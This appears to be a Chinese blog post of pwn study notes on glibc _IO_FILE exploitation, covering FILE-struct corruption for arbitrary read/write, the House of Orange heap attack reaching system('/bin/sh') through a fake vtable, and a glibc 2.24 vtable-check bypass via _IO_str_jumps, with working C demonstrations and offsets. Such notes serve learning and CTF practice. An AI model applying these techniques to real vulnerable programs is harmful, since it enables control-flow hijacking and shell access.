---
layout: post
title: IO_FILE初探
category: system
date: 2023-11-09 20:39:36
updated: 2023-11-20 15:03:00
---
以house of orange为首的IO_FILE利用
<!-- more -->

[toc]


# IO_FILE之任意读写(glibc2.23-Latest)

## 使用stdin标准输入进行任意写

若我们可以控制`_IO_FILE`的指针，且程序中会调用`fgets`或者`fread`等函数，那么我们便可以利用`stdin`来进行任意地址写。

为了能够更清晰地看到在`glibc`中是如何进行`IO`操作的，让我们来通过源码跟进一下一个`fread`操作。我的测试环境是在`glibc2.23`，但是通过`stdin`进行任意写的操作在目前最新版本`glibc2.34`中也是可以使用的。

在开始之前，我们需要知道`_IO_FILE`结构体中几个成员变量的含义：

- `_IO_buf_base`和`_IO_buf_end`：两个值分别代表了文件流缓冲区的开始和结束位置，任何超过这个范围的读写操作都是不合法的。
- `_IO_write_base`和`_IO_write_ptr`和`_IO_write_end`：它们分别表示当前文件写操作的开始、当前、结束位置，位于`_IO_buf_base`和`_IO_buf_end`之间。
- `_IO_read_base`和`_IO_read_ptr`和`_IO_read_end`：它们分别表示当前文件读操作的开始、当前、结束位置，位于`_IO_buf_base`和`_IO_buf_end`之间。

我们使用`gdb`，跟进`fread(content, 1, 0x20, fp);`这样一行代码，发现其在`glibc`中实际上是`_IO_fread`函数，位于`libio`文件夹下的`iofread.c`中：

```c
// 位于libio/iofread.c
_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t bytes_requested = size * count; // size乘以数量，获得请求的字节数
  _IO_size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0) // 请求字节数为0则无事发生
    return 0;
  _IO_acquire_lock (fp); // 对文件操作加锁
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); // 实际上是使用_IO_sgetn函数进行读取的
  _IO_release_lock (fp); // 取消锁
  return bytes_requested == bytes_read ? count : bytes_read / size; // 返回实际读取到的变量个数，变量的单位大小是sizem
}
```

从上面得知，目前`fread`函数的调用链实际上是`fread() -> _IO_fread() -> _IO_sgetn() `。我们跟进`_IO_sgetn()`函数如下：

```c
// 位于libio/genops.c
_IO_size_t
_IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n) // 在上一层函数已经转换为了三个参数，即文件指针，读入的数据，请求的字节数
{
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n); // 朴实无华的调用_IO_XSGETN()函数
}
```

继续使用了`_IO_XSGETN()`函数，继续跟进：

```c
// 位于libio/fileops.c
_IO_size_t
    _IO_file_xsgetn(_IO_FILE *fp, void *data, _IO_size_t n) // 三个参数分别代表文件指针、读入的变量、读入的字节数
{
  _IO_size_t want, have;
  _IO_ssize_t count;
  char *s = data; // s指向读入的变量

  want = n; // want代表当前还需要读取的字节数

  if (fp->_IO_buf_base == NULL) // 若当前文件缓冲区为空，那么使用_IO_doalloc_buf来建立缓冲区
  {
    /* Maybe we already have a push back pointer.  */
    if (fp->_IO_save_base != NULL) // 假如当前文件缓存区存在一个备份，那么将其释放掉，不再需要，因为要使用_IO_doallocbuf来建立缓冲区
    {
      free(fp->_IO_save_base);
      fp->_flags &= ~_IO_IN_BACKUP;
    }
    _IO_doallocbuf(fp); // 建立缓冲区，内部细节我们不再跟进
  }

  while (want > 0) // 当前还需要读取的字节数大于0
  {
    // 假如还可以从缓冲区读取一些数据，那么会直接将缓冲区里的数据通过memcpy复制到s中。
    // 那么，为了能够使得使用stdin任意写，那么我们最好使得fp->_IO_read_end == fp->_IO_read_ptr，代表并不是处于读取的过程中
    have = fp->_IO_read_end - fp->_IO_read_ptr;
    if (want <= have)
    {
      memcpy(s, fp->_IO_read_ptr, want);
      fp->_IO_read_ptr += want;
      want = 0;
    }
    else // 我们使得_IO_read_ptr等于_IO_read_end之后进入这个分支
    {
      if (have > 0) // 这个if语句作用和上面一样，再次检查有没有还没读入的数据。有的话会使用memcpy读入变量s，不用理会。
      {
#ifdef _LIBC
        s = __mempcpy(s, fp->_IO_read_ptr, have);
#else
        memcpy(s, fp->_IO_read_ptr, have);
        s += have;
#endif
        want -= have;
        fp->_IO_read_ptr += have;
      }

      /* Check for backup and repeat */
      // 假如当前文件流处于备份模式，那么从备份缓冲区切换回主缓冲区，不用理会
      if (_IO_in_backup(fp))
      {
        _IO_switch_to_main_get_area(fp);
        continue;
      }

      /* If we now want less than a buffer, underflow and repeat
         the copy.  Otherwise, _IO_SYSREAD directly to
         the user buffer. */
      // 假如说文件流缓冲区已经建立，而且请求的字节数是小于_IO_buf_base和_IO_buf_end之间的缓冲区大小的，那么调用__underflow来读取数据
      if (fp->_IO_buf_base && want < (size_t)(fp->_IO_buf_end - fp->_IO_buf_base))
      {
        // 实际上是调用__underflow来读取数据
        if (__underflow(fp) == EOF)
          break;

        continue;
      }
      // 假如不满足上述条件，那么会重新设置_IO_buf_base，难以利用，因此我们利用上面__underflow，以下不再跟进
	...

  return n - want;
}
```

上面的`_IO_file_xsgetn()`函数会首先会通过`_IO_read_ptr`和`_IO_read_end`来检查是否有未读完的数据，然后检查缓冲区是否设置，读取的字节数是否小于缓冲区大小，若满足则调用`__underflow`来读取数据。继续跟进：

```c
// 位于libio/genops.c
int
__underflow (_IO_FILE *fp) // 再次进行一系列几乎已经做过的检查，然后调用_IO_UNDERFLOW函数读取
{
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  if (_IO_vtable_offset (fp) == 0 && _IO_fwide (fp, -1) != -1)
    return EOF;
#endif

  if (fp->_mode == 0)
    _IO_fwide (fp, -1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_get_mode (fp) == EOF)
      return EOF;
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;
  if (_IO_in_backup (fp))
    {
      _IO_switch_to_main_get_area (fp);
      if (fp->_IO_read_ptr < fp->_IO_read_end)
	return *(unsigned char *) fp->_IO_read_ptr;
    }
  if (_IO_have_markers (fp))
    {
      if (save_for_backup (fp, fp->_IO_read_end))
	return EOF;
    }
  else if (_IO_have_backup (fp))
    _IO_free_backup_area (fp);
  return _IO_UNDERFLOW (fp);
}
```

跟进`_IO_UNDERFLOW()`函数：

```c
// 位于libio/fileops.c
int _IO_new_file_underflow(_IO_FILE *fp)
{
  _IO_ssize_t count;
#if 0
  /* SysV does not make this test; take it out for compatibility */
  if (fp->_flags & _IO_EOF_SEEN)
    return (EOF);
#endif

  if (fp->_flags & _IO_NO_READS) // 检查文件指针fp是否有不允许读的标志位，有的话报错返回
  {
    fp->_flags |= _IO_ERR_SEEN;
    __set_errno(EBADF);
    return EOF;
  }
  if (fp->_IO_read_ptr < fp->_IO_read_end) // 再次检查是否有未读完的数据，有的话返回这些未读完的数据
    return *(unsigned char *)fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL) // 再次检查是否缓冲区未建立。
  {
    /* Maybe we already have a push back pointer.  */
    if (fp->_IO_save_base != NULL)
    {
      free(fp->_IO_save_base);
      fp->_flags &= ~_IO_IN_BACKUP;
    }
    _IO_doallocbuf(fp);
  }

  /* Flush all line buffered files before reading. */
  /* FIXME This can/should be moved to genops ?? */
  // 在读取之前对文件流进行一个刷新，需要flag含有0x208
  if (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
  {
#if 0
      _IO_flush_all_linebuffered ();
#else
    /* We used to flush all line-buffered stream.  This really isn't
 required by any standard.  My recollection is that
 traditional Unix systems did this for stdout.  stderr better
 not be line buffered.  So we do just that here
 explicitly.  --drepper */
    _IO_acquire_lock(_IO_stdout);

    if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF))
      _IO_OVERFLOW(_IO_stdout, EOF);

    _IO_release_lock(_IO_stdout);
#endif
  }

  _IO_switch_to_get_mode(fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  // 由于不存在要读和要写的数据（前面已经检查），那么将这些指针都设置为缓冲区开始的位置
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = fp->_IO_buf_base;
  
  // 使用read系统调用来进行读取。内部是读取了fp的fileno，因此我们将fileno劫持为0时，其将会使用stdin标准输入流进行读取。
  // 读到的位置是fp->_IO_buf_base，读取的大小是这个缓冲区的大小。
  count = _IO_SYSREAD(fp, fp->_IO_buf_base,
                      fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
  {
    if (count == 0)
      fp->_flags |= _IO_EOF_SEEN;
    else
      fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
  {
    /* If a stream is read to EOF, the calling application may switch active
 handles.  As a result, our offset cache would no longer be valid, so
 unset it.  */
    fp->_offset = _IO_pos_BAD;
    return EOF;
  }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust(fp->_offset, count);
  return *(unsigned char *)fp->_IO_read_ptr;
}
```

从上面可知，只要我们将`fp`指针指向的`fileno`劫持为`0`即`stdin`，那么其将会从标准输入读取数据到`fp->_IO_buf_base`到`fp->_IO_buf_end`这一块区域。若我们同样劫持了这两个值为我们需要进行写的地方，那么就可以进行任意写了。完整的函数调用链如下：

```c
fread() -> _IO_fread() -> _IO_sgetn() -> _IO_file_xsgetn() -> __underflow() -> _IO_UNDERFLOW() -> _IO_new_file_underflow() -> _IO_SYSREAD()
```

另外，`fgets`函数也可以进行同样的劫持，因为其读取方式和上述过程几乎一样，其函数利用链为：

```c
fgets() -> _IO_fgets() -> _IO_getline() -> _IO_getline_info() -> __uflow() -> _IO_UNDERFLOW() -> _IO_new_file_underflow() -> _IO_SYSREAD()
```

我们用一段带详细注释的`C`代码来表示我们劫持的过程：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void normal_process(char *secret)
{
    FILE *fp = fopen("./flag", "r");
    char *content = (char *)malloc(0x20);

    fread(content, 1, 0x5, fp);
    if (*secret == 0)
    {
        printf("Oh, it seems no secret here...\n");
    }else{
        printf("The secret is : %s.\n", secret);
    }
    fclose(fp);
    return;
}

void arbitry_write(char* secret)
{
    FILE *fp = fopen("./flag", "r");
    char *content = (char *)malloc(0x20);
    char junk[5];

    // 做一些操作
    // _fileno的偏移为0x70
    // _IO_read_ptr为0x8
    // _IO_read_end为0x10
    // _IO_buf_base为0x38
    // _IO_buf_end为0x40

    // 我们构造以下条件：
    // 1.设置_IO_read_end == _IO_read_ptr
    *(size_t *)((char *)fp + 0x8) = 0;
    *(size_t *)((char *)fp + 0x10) = 0;

    // 2.设置fp->_flags & _IO_NO_READS为假，由于_IO_NO_READS为4，那么倒数第二字节为0
    *(size_t *)((short *)fp) = 0;

    // 3.设置fileno为0，由此将会从标准输入读取数据
    *(size_t*)((char*)fp + 0x70) = 0;

    // 4.由fp->_IO_buf_end和fp->_IO_buf_base来设置通过read写入的位置，其中fp->_IO_buf_base为写入的起始位置，end要比写入的结束位置略大
    *(size_t*)((char*)fp + 0x38) = (size_t)secret;
    *(size_t*)((char*)fp + 0x40) = (size_t)secret + 0x6;

    // 调用fread触发read系统调用
    fread(content, 1, 0x5, fp);
    // fgets(junk, 0x5, fp);

    if(*secret == 0){
        printf("Dave, my mind is going...\n");
    }else{
        printf("The secret is %s, how dare you?\n", secret);
    }
    
    fclose(fp);
    return;
}

int main()
{
    char *secret = (char *)malloc(0x20);
    memset(secret, 0, 0x20);
    printf("--- Let's see the normal process... --- \n");
    normal_process(secret);
    printf("--- Now we try to make a arbitry write... ---\n");
    arbitry_write(secret);
    return 0;
}
```

最后，我们总结一下使用`stdin`进行任意写的条件，以供快速查阅：

- `fp -> _IO_read_end == fp -> _IO_read_ptr`，偏移分别为`0x10`和`0x8`
- `fp -> _flags & _IO_NO_READS`为假，由于`_IO_NO_READS`为`4`，那么需要设置倒数第二字节为`0`.
- `fp -> _fileno == 0`，其偏移为`0x70`
- `fp -> _IO_buf_base`和`fp -> _IO_buf_end`指向要通过`read`写入的位置，且要略大于要读入的字节数。偏移为`0x38`和`0x40`。

## 使用stdout标准输出进行任意读写

`stdin`是将输入数据拷贝到缓冲区，而`stdout`会先将数据拷贝到缓冲区，然后将缓冲区数据进行输出。因此，若我们能够劫持`stdout`，那么既可以进行任意写，也可以进行任意读。

### 任意写

我们上面提到了`stdout`的输出包括两个部分，任意写的操作就是根据`stdout`会先将数据拷贝到缓冲区这一步来进行劫持的。

因此，只要我们能够控制缓冲区的开始位置和结束位置，且输出的数据可控，那么我们就可以进行任意数据写。

一段劫持`stdout`进行任意写的`C`代码如下：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


int main(){
    char secret[0x20] = "flag{th1s_1s_my_secret_flag!}";
    char flag[0x20];
    
    FILE* fp = fopen("./content", "wr");

    // 原意是向content文件中写入长度为0x20的secret变量
    // 我们通过劫持，能够实现其向任意位置写secret变量
    

    // 我们需要劫持fp->_IO_write_ptr和fp->_IO_write_end，其偏移分别为0x28和0x30
    *(size_t*)((char*)fp + 0x28) = (size_t)flag;
    *(size_t*)((char*)fp + 0x30) = (size_t)((size_t)flag + 0x20);

    fwrite(secret, 0x20, 1, fp);

    printf("The flag is %s. How could you change it?\n", flag);
    return 0;
}
```

总结一下`stdout`的任意写，只需要构造：

- `fp -> _IO_write_ptr`和`fp -> _IO_write_end`，指向要写的位置。写的内容为`fwrite`的第一个参数，即变量的内容。偏移为`0x28`和`0x30`。

### 任意读



# House of orange(glibc 2.23)🍊

一句话描述该漏洞：将`top chunk`置入`unsortedbin`并打`unsortedbin attack`对`_IO_list_all`写入`main_arena+88`，将该`chunk`置入`smallbin`，使其`_IO_list_all`的`_chain`刚好指向该`chunk`，便可劫持`vtable`来触发`FSOP`。

先看一下总体流程：

- 通过漏洞修改`top chunk`的`size`，使得系统以`brk`的方式来扩展空间，此时`top chunk`会被置入到`unsorted bin`中去
- 利用`unsortedbin attack`，将`_IO_list_all`指针的值改写为`unsortedbin`的头`chunk`地址，即`main_arena+88`
- 通过再次修改该`unsorted chunk`的`size`为`0x61`，使其被置入`smallbin[4]`中，如此以来`main_arena+88+0x68`（也就是`_IO_list_all`的`_chain`）将指向这个`chunk`
- 再次`malloc`的时候由于`unsortedbin`中指针被修改，因此会触发调用链`malloc() -> malloc_printerr() -> __libc_message() -> abort() -> fflush() -> _IO_flush_all_lockp() -> _IO_new_file_overflow()`。而最终调用的函数实际上是调用了`_IO_FILE_plus.vtable`中的`_IO_OVERFLOW`函数，函数原型为`_IO_OVERFLOW(fp, EOF)`。通过上面的`chunk`覆盖函数指针，将`_IO_FILE`结构体0字节偏移处的`fp`写为`/bin/sh`，即可获得`shell`。

以上就是`House of orange`的简要流程，整个流程在我第一次见的时候是相当震撼的，因此只能慢慢嚼碎再咽下去。

## 0x00: 将top chunk置入unsortedbin

需要利用的漏洞：控制`top chunk`的`size`

当程序调用`malloc`时，系统会以此检查`fastbin`、`small bins`、`unsorted bin`、`large bins`是否满足分配要求。若都不满足，那么`_init_malloc`函数会试图使用`top chunk`。若`top_chunk`也不满足分配要求，那么`ptmalloc`将会执行`sysmalloc`来申请更多的空间。此时有两种分配方式，一种是`brk`，而另一种是`mmap`。我们需要让`sysmalloc`以`brk`的方式扩展内存，因为`brk`方式扩展内存后，会将原有的`top chunk`置入到`unsorted bin`中。到这里，我们已经明白如何让`top chunk`被置入到`unsortedbin`：一是`top chunk`不满足分配要求，二是让系统以`brk`方式扩展内存。要满足这些条件，我们要使得：

- 伪造的`top chunk`的`size`对齐到内存页（自己计算，要使得其`top chunk addr+size`对齐`0x1000`）
- `size`大于`MINSIZE(0X10)`
- `top chunk size`小于之后申请的`chunk size + MINSIZE`（使其使用`brk`扩展）
- `top chunk size`的`prev_inuse`位为1
- 申请的内存小于`mmap`阈值，即`0x20000`

满足上述条件后我们即可以在`malloc`一个`chunk`的时候将`top chunk`置入到`unsorted bin`中，这段代码如下：

```c
char* p1 = malloc(0x400-0x10); // 先申请一个大小为0x400的chunk，它的下一个chunk即为top chunk

size_t* top = (size_t *) ( (char *) p1 + 0x400 - 0x10); // 获得top chunk，也就是p1的用户地址加上0x400-0x10
top[1] = 0xc01; // 修改top chunk的size为0xc01，使其能够对齐0x1000，且小于接下来申请的一个不大于0x20000的请求

char* p2 = malloc(0x1000); // 申请一个大于top chunk size的内存空间，将会使用brk申请空间，同时使得top chunk被置入unsortedbin
```

运行这段代码后，效果如下，其中第一个`chunk`是申请的大小为`0x400`的`chunk`，第二个是已经位于`unsorted bin`中的以前的`top chunk`，另外两个`chunk`是在这个过程中产生的`chunk`，暂时不清楚原因。

![image-20231109151427847](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20231109151427847.png)

`bins`中如下：

![image-20231109151602936](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20231109151602936.png)

## 0X01: 使用Unsortedbin attack改写_IO_list_all指针

需要利用的漏洞：`unsortedbin attack`，需要你能够控制刚刚的`top chunk`的`bk`指针

由于最开始的`top chunk`已经位于`unsortedbin`中，我们可由其`fd`和`bk`泄露出`libc`，也就可以获得`libc`具有固定偏移的`io_list_all`的地址。我们将`top chunk`的`bk`写为`_IO_list_all-0x10`，在下一次`malloc`时便将会触发`unsortedbin attack`，往`_IO_list_all`中写入`main_arena+88`。我们知道`_IO_list_all`本来是指向`_IO_2_1_stderr_`的，即指向一个`_IO_FILE_plus`结构，那么`main_arena+88`地址开始处也会被当做一个`_IO_FILE_plus`结构体。然而，此处空间我们并不是可控的，该怎么办呢？先不管，我们先看这一段的代码：

```c
// 由于top chunk位于unsortedbin，我们知道此时chunk的fd和bk都会指向libc固定偏移main_arena+88
io_list_all = top[2] + 0x9a8; // 由此也可以获得libc固定偏移的io_list_all的地址

top[3] = io_list_all - 0x10; // 将top chunk的bk写为io_list_all-0x10，触发unsortedbin attack
```

## 0x02: 将top chunk置入smallbin使得_chain指向该chunk

 需要利用的漏洞：仍然是控制`top chunk`即可

根据上面的问题，很显然，我们需要能够控制`_IO_FILE_plus`结构体的空间才可以继续。目前我们已经使得`_IO_list_all`指向了`main_arena+88`，那么`main_arena+88`处的地址空间将会被当做一个`IO_FILE_plus`结构体，而该结构体里面含有一个`_chain`域即`_IO_FILE_plus.file._chain`，它指向下一个`IO_FILE_plus`结构。若我们能够控制该`_chain`指向一个我们可以控制的`chunk`，这样一来当前的`IO_FILE_plus`指向的下一个`IO_FILE_plus`就完全受我们控制了。此时问题就回到，如何控制该`_chain`？`_chain`在`_IO_FILE_plus`结构体中的偏移为`0x68`，即`main_arena+88+0x68`，即`main_arena+192`。实际上，`main_arena`附近的内存空间相对复杂，笔者通过`mallopt(M_MXFAST,0)`的方式禁用`fastbin`，得到如下结果：

![image-20231109183045439](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20231109183045439.png)

从图上可以看到，`main_arena+192`指向的区域是大小为`0x60`的`smallbin`中的最后一个`chunk`，也就是`smallbin(0x60)->bk`。那么，接下来我们就将`top chunk`挂入大小为`0x60`的`smallbin`，挂入后`_IO_FILE_plus`的`_chain`就将指向这个`top chunk`，也就是`top chunk`会成为下一个`_IO_FILE_plus`。此外，最终我们执行的代码是`_IO_OVERFLOW(fp, EOF)`，而其中的`fp`实际上也就是`top chunk`的地址，因此若我们在`top chunk`的地址处写下`/bin/sh\x00`，那么相当于执行了`_IO_OVERFLOW('/bin/sh\x00')`，覆盖函数指针后就是`system('/bin/sh\x00')`。

这部分的代码如下：

```c
memcpy( ( char *) top, "/bin/sh\x00", 8); // 最终执行的_IO_OVERFLOW(fp, EOF)中的fp实际上是_IO_FILE_plus结构体的地址，对应top chunk的地址
// 因此直接往top chunk地址处写/bin/sh\x00

top[1] = 0x61; // 更改top chunk的size为0x61，在触发unsortedbin attack后，还会将其挂入大小为0x60的smallbin
// 这是因为main_arena + 192是指向大小为0x60的smallbin的最后一个chunk的，如此以来第一个_IO_FILE_plus的_chain指向top chunk
```

## 0x03: 满足利用条件，触发FSOP调用链获得shell

需要利用的漏洞：控制`top chunk`即可

有的读者可能注意到我们将`top chunk`置入`unsortedbin`后，一直没有调用`malloc`来触发`unsortedbin attack`，也没有将`top chunk`置入`small bin`中。实际上在最后调用`malloc`时，这个申请内存的操作会先后触发`unsortedbin attack`，然后将其置入`small bin`；并且由于`unsortedbin attack`时已经破坏了其链表结构，因此会触发`malloc() -> malloc_printerr() -> __libc_message() -> abort() -> fflush() -> _IO_flush_all_lockp() -> _IO_new_file_overflow()`函数的调用链。因此，在`malloc`之前，我们需要检查剩下的安全机制，来保证我们的攻击可以成功。在`_IO_flush_all_lockp()`函数中，要满足要求`fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base`。因此，可以设置如下条件：

- `fp->_mode=0`，其中`_mode`对于起始位置的偏移是`0xc0`
- `fp->_IO_write_base = (char*)2;`
- `fp->_IO_wirte_ptr = (char*)3;`

满足以上条件后，我们便可以覆盖掉`_IO_new_file_overflow`函数的函数指针了。`vtable`中的函数如下：

```c
void * funcs[] = {
   1 NULL, // "extra word"
   2 NULL, // DUMMY
   3 exit, // finish
   4 NULL, // overflow
   5 NULL, // underflow
   6 NULL, // uflow
   7 NULL, // pbackfail
   8 NULL, // xsputn  #printf
   9 NULL, // xsgetn
   10 NULL, // seekoff
   11 NULL, // seekpos
   12 NULL, // setbuf
   13 NULL, // sync
   14 NULL, // doallocate
   15 NULL, // read
   16 NULL, // write
   17 NULL, // seek
   18 pwn,  // close
   19 NULL, // stat
   20 NULL, // showmanyc
   21 NULL, // imbue
};
```

这里我们需要覆盖`overflow`函数，也就是`vtable[3]`。而另外`vtable`相对于`_IO_FILE_plus`起始地址处的偏移是`0xd8`。`top chunk`的`IO_FILE_plus`结构体中的`vtable`是可以任意构造值的，我们将其设置到`top chunk`处的任意地方即可，只需要注意`fake_vtable->overflow`处不要被占用。这部分代码如下：

```c
// 将top chunk解释为一个FILE结构体
FILE *fp = (FILE *) top;
// 满足函数调用链中的_IO_flush_all_lockp()函数的要求
fp->_mode = 0; // top+0xc0
fp->_IO_write_base = (char *) 2; // top+0x20
fp->_IO_write_ptr = (char *) 3; // top+0x28

size_t *jump_table = &top[20]; // 我们将top chunk的vtable指向自身的某个地方，随意
jump_table[3] = (size_t) &winner; // top chunk的vtable的第[3]个函数也就是overflow，将其函数指针设置为winner
*(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top chunk的vtable指向刚刚设置的fake vtable

malloc(10); // 最终进行一次malloc，来完成unsortedbin attack开始的所有流程
```

其中`winner`函数就是咱们的后门函数。

```c
int winner(char *ptr)
{ 
    system(ptr); // 按照上面的步骤会传入一个/bin/sh
    syscall(SYS_exit, 0);
    return 0;
}
```

参考链接：

[ha1vik师傅](https://blog.csdn.net/seaaseesa/article/details/104314949)

[House_of_orange学习小结](https://www.cnblogs.com/L0g4n-blog/p/14217309.html)

[借助gdb调试glibc代码学习House of Orange - 简书 (jianshu.com)](https://www.jianshu.com/p/57a5c9a492aa?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)

# glibc2.24下的vtable check以及绕过

## vtable的check

在`glibc 2.23`中，我们可以劫持`_IO_FILE_plus`中的`vtable`，并使其指向我们可控的内存区域，便可使用`FSOP`等方式调用我们所需的函数。

然而，在`glibc2.24`下就有了关于`vtable`劫持的`check`。例如，我们可以在`glibc2.23`下使用如下代码完成`vtable`的劫持，触发后门函数：

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void winner(char* code){
    system("echo win");
}


// 这个main函数在glibc2.23是完全可行的，最终可以执行winner函数。
int main(){
    // 我们通过打开一个文件的方式，来得到一个_IO_FILE_plus指针fp
    FILE* fp = fopen("./flag", "r");

    // 我们创建一个fake_vtable，尝试劫持_IO_FILE_plus的vtable指针
    size_t* fake_vtable = (size_t*)malloc(0x100);

    // 劫持vtable为fake_vtable
    *(size_t*)((char*)(fp) + 0xd8) = (size_t)fake_vtable;
    
    // 这条函数调用链最终会调用_IO_overflow,是vtable中的第三个函数指针
    fake_vtable[3] = (size_t)winner;

    // 要满足安全机制
    *(size_t*)((char*)fp + 0x20) = 1;
    *(size_t*)((char*)fp + 0x28) = 2;

    // 最终会在exit、return、以及libc执行abort调用。
    return 0;
}
```

上面的代码通过正常退出程序，程序使用`_IO_flush_all_lockp() -> _IO_new_file_overflow()`方式情况调用`_IO_FILE_plus`中的`_IO_overflow`函数来清空缓冲区。由于我们劫持了`vtable`并覆盖了`_IO_overflow`函数为后门函数，因此可以触发后门，效果如下所示：

![image-20231115171452969](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311151714126.png)

然而，上面这段代码在`glibc2.24`下完全不可行，并且抛出`Fatal error: glibc detected an invalid stdio handle`错误：

![image-20231115171538959](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311151715000.png)

这是因为在`glibc2.24`中新增了对`vtable`的安全检查：

```c
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; // 存放虚表的空间的长度
  const char *ptr = (const char *) vtable; // 我们构造的虚表
  uintptr_t offset = ptr - __start___libc_IO_vtables; // 我们构造的虚表的地址减去存放虚表的空间开始处地址，得到偏移
  if (__glibc_unlikely (offset >= section_length)) // 偏移比整个空间长度要大，可能不合法
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

上面的代码可能看起来有些吃力，但是在了解到下面的知识后就会轻松很多：

- 在`glibc`中，存在多种`vtables`，用于不同场景下，例如`_IO_FILE_plus`中的`_IO_file_jumps`虚表就用于文件操作

- 这些虚表都位于`__stop___libc_IO_vtables`以及`__start___libc_IO_vtables`两个变量之间
- 比如有`_IO_file_jumps`虚表、`_IO_str_jumps`虚表

根据以上知识，我们可以得知，上面的代码将会校验`_IO_FILE_plus`的虚表是否位于存放虚表的那一片空间内，若不位于存放虚表的那片空间，则会进一步通过`_IO_vtable_check()`函数进行校验，而该函数较难进行绕过，因此我们在`glibc2.23`下已经无法通过以前的方式对`vtable`进行劫持了。

## 柳暗花明

我们上面提到：

**在`glibc`中，存在多种`vtables`，用于不同场景下，例如`_IO_FILE_plus`中的`_IO_file_jumps`虚表就用于文件操作**

那么，虽然我们无法像以前一样劫持`vtable`到可控的堆空间，但我们可以劫持`_IO_file_jumps`为其他的虚表，例如`_IO_str_jumps`虚表。

劫持为其他虚表后，我们可以利用逻辑上的一些问题进行攻击。

## 新的利用链 _IO_flush_all_lockp -> _IO_str_finish（<=glibc2.27可用）

我们上面已知可以合法的将`_IO_FILE_plus`的`vtable`劫持为`_IO_str_jumps`虚表。那这有什么作用呢？

在`_IO_str_jumps`虚表中，有一个函数叫做`_IO_str_finish`：

```c
void _IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base); //执行函数
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```

其中有一处非常关键：

```c
(((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
```

可以看到`_IO_str_finish`函数中，通过`_IO_FILE_plus`指针`fp`的偏移来执行了一个函数。为什么我们要劫持`vtable`而不是直接修改`vtable`里面的函数？是因为`vtable`是不可写的！而在`_IO_str_finish`函数中，可以通过`fp`的偏移来执行函数，而我们知道`fp`即结构体`_IO_FILE_plus`是完全可写的。因此，只要我们劫持`_IO_FILE_plus`的`vtable`为`_IO_str_jumps`，并将`fp`对应偏移处修改为`system`函数的指针，那么就可以通过下面的函数调用链（正常退出、`exit`、`abort`）来执行任意函数了：

```c
_IO_flush_all_lockp() -> _IO_str_finish() -> system()
```

其实有的师傅可能会问，函数调用链不是`_IO_flush_all_lockp() -> _IO_new_file_overflow()`吗？如何才能执行到`_IO_str_finish`函数呢？

在`_IO_str_jumps`表中，有如下函数：

```c
pwndbg> p _IO_str_jumps
$1 = {
  __dummy = 0,
  __dummy2 = 0,
  __finish = 0x7ffff7a8f650 <_IO_str_finish>,
  __overflow = 0x7ffff7a8f2b0 <__GI__IO_str_overflow>,
  __underflow = 0x7ffff7a8f250 <__GI__IO_str_underflow>,
  __uflow = 0x7ffff7a8d8a0 <__GI__IO_default_uflow>,
  __pbackfail = 0x7ffff7a8f630 <__GI__IO_str_pbackfail>,
  __xsputn = 0x7ffff7a8d900 <__GI__IO_default_xsputn>,
  __xsgetn = 0x7ffff7a8da90 <__GI__IO_default_xsgetn>,
  __seekoff = 0x7ffff7a8f780 <__GI__IO_str_seekoff>,
  __seekpos = 0x7ffff7a8de40 <_IO_default_seekpos>,
  __setbuf = 0x7ffff7a8dd10 <_IO_default_setbuf>,
  __sync = 0x7ffff7a8e0c0 <_IO_default_sync>,
  __doallocate = 0x7ffff7a8deb0 <__GI__IO_default_doallocate>,
  __read = 0x7ffff7a8f100 <_IO_default_read>,
  __write = 0x7ffff7a8f110 <_IO_default_write>,
  __seek = 0x7ffff7a8f0e0 <_IO_default_seek>,
  __close = 0x7ffff7a8e0c0 <_IO_default_sync>,
  __stat = 0x7ffff7a8f0f0 <_IO_default_stat>,
  __showmanyc = 0x7ffff7a8f120 <_IO_default_showmanyc>,
  __imbue = 0x7ffff7a8f130 <_IO_default_imbue>
}
```

